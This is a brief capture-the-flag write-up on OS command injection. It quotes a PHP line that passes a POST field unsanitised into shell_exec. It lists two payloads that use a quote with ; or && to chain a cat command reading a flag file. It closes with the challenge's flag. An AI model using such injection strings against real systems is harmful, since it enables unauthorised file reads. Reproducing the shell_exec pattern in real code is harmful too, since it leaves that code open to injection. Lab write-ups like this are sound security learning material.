* Category
  * OS Command Injection
* Solution
  1. How to separate commands?
     * unconditionally
       * ```;```
     * run cmd2 only if cmd1 succeeds
       * ```&&```
  2. ```<?= shell_exec("host '" . $_POST['name'] . "';") ?>```
     * The input value is part of parameter in ```shell_exec```
     * close ```host``` command with ```'```
     * Use either  ```;``` or ```&&``` to separate ```host``` command and desired command
     * close ```';``` with ```'```
* Payload
  1. ```'; cat ../../../flag_44ebd3936a907d59;'```
  2. ```example.com' && cat ../../../flag_44ebd3936a907d59;'```
* Reference
  * [execute two shell commands in single exec php statement](https://stackoverflow.com/questions/7122742/execute-two-shell-commands-in-single-exec-php-statement)
* ```FLAG{B4by_c0mmand_1njection!}```